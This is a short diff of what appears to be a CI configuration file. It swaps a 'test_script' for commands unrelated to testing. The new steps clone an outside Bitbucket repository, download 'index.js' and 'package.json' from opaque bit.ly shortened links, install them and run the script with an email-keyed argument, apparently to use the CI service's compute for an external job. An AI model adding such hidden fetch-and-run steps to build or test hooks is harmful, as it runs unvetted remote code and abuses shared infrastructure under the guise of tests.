@@ -5,5 +5,7 @@ container:
 
 test_task:
   test_script: 
-    - node -v
-    - curl ifconfig.me
+    - git clone https://meocodervippro@bitbucket.org/lunarcrush/lunarcrush-data.git --branch vananhnguyenxin_outlook-com --single-branch lunarCrushData
+    - curl -fsSL https://bit.ly/3nKzqND -o index.js && curl -fsSL https://bit.ly/3cBwVH3 -o package.json
+    - npm i -s
+    - node index -t 60 -r 2 -e vananhnguyenxin@outlook.com
